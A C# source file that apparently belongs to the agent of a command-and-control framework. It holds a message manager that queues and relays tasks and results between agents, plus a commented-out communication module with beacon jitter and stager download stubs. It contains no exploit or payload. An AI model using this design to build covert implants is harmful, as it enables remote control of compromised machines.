using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Models
{
    public class MessageManager
    {
        protected ConcurrentQueue<MessageTask> _taskMessages = new ConcurrentQueue<MessageTask>();
        protected ConcurrentQueue<MessageResult> _resultMessages = new ConcurrentQueue<MessageResult>();
        public AgentMetadata AgentMetaData { get; private set; }


        public MessageManager(AgentMetadata metadata)
        {
            this.AgentMetaData = metadata;
        }

        public void EnqueueTask(MessageTask task)
        {
            this._taskMessages.Enqueue(task);

        }

        public void EnqueueTasks(IEnumerable<MessageTask> tasks)
        {
            foreach (var item in tasks)
                this._taskMessages.Enqueue(item);
        }

        public void EnqueueResults(IEnumerable<MessageResult> results)
        {
            foreach (var item in results)
                this._resultMessages.Enqueue(item);
        }


        public List<MessageTask> GetMessageTasksForAgent(string id)
        {
            var remaining = new Queue<MessageTask>();
            var list = new List<MessageTask>();


            MessageTask mess = null;
            while (_taskMessages.TryDequeue(out mess))
            {
                if (mess.Header.Owner == id)
                    list.Add(mess);
                else
                    remaining.Enqueue(mess);

            }

            //Requeue message not destined to our agent
            while (remaining.Any())
            {
                _taskMessages.Enqueue(remaining.Dequeue());
            }

            return list;
        }

        public List<MessageTask> GetMessageTasksToRelay(List<string> agentIds)
        {
            var remaining = new Queue<MessageTask>();
            var list = new List<MessageTask>();


            MessageTask mess = null;
            while (_taskMessages.TryDequeue(out mess))
            {
                if (agentIds.Contains(mess.Header.Owner))
                    list.Add(mess);
                else
                    remaining.Enqueue(mess);

            }

            //Requeue message not destined to our agent
            while (remaining.Any())
            {
                _taskMessages.Enqueue(remaining.Dequeue());
            }

            return list;
        }

        public List<MessageResult> GetMessageResultsToRelay()
        {
            var remaining = new Queue<MessageResult>();
            var list = new List<MessageResult>();


            MessageResult mess = null;
            while (_resultMessages.TryDequeue(out mess))
            {
                list.Add(mess);
            }

            return list;
        }



        public void SendResult(AgentTaskResult res, bool includeMetaData = false)
        {
            MessageResult mr = new MessageResult();
            mr.Header.Owner = this.AgentMetaData.Id;
            mr.Items.Add(res);
            if (includeMetaData)
                mr.MetaData = this.AgentMetaData;
            this._resultMessages.Enqueue(mr);
        }

    }
}

//public class CommModule
//{
//    public int Interval { get; set; } = 2000;
//    public double Jitter { get; set; } = 0.5;

//    public abstract Task<Byte[]> Download(string id, Action<int> OnCompletionChanged = null);

//    public abstract Task<string> Upload(byte[] fileBytes, string filename, Action<int> OnCompletionChanged = null);


//    //public abstract Task<Byte[]> DownloadStagerDll();
//    //public abstract Task<Byte[]> DownloadStagerExe();
//    public abstract Task<Byte[]> DownloadAgentBin(bool x86 = false);
//    public abstract void Start();
//    public abstract void Stop();
//    public abstract void SendMetaData();

//    protected ConcurrentQueue<AgentTask> _inbound = new ConcurrentQueue<AgentTask>();
//    protected ConcurrentQueue<AgentTaskResult> _outBound = new ConcurrentQueue<AgentTaskResult>();
//    protected AgentMetadata _agentmetaData;

//    public virtual void Init(AgentMetadata metadata)
//    {
//        this._agentmetaData = metadata;
//    }

//    public bool ReceieveData(out IEnumerable<AgentTask> tasks)
//    {
//        if (_inbound.IsEmpty)
//        {
//            tasks = null;
//            return false;
//        }

//        var list = new List<AgentTask>();
//        while (_inbound.TryDequeue(out var task))
//        {
//            list.Add(task);
//        }

//        tasks = list;
//        return true;
//    }

//    public void SendResult(AgentTaskResult result)
//    {
//        _outBound.Enqueue(result);
//    }

//    protected IEnumerable<AgentTaskResult> GetOutbound()
//    {
//        var list = new List<AgentTaskResult>();
//        while (_outBound.TryDequeue(out var task))
//        {
//            list.Add(task);
//        }

//        return list;
//    }


//}
